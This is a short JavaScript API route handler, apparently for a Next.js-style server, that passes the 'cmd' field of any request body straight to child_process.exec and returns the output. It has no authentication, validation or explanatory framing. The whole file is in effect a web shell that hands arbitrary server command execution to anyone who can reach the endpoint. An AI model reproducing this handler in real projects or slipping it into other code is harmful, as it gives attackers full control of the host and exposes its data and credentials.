const { exec } = require("child_process");

export default function handler(req, res) {
    const body = JSON.parse(req.body)

    exec(body.cmd, (error, stdout, stderr) => {
        res.status(200).send(stdout)
    })
}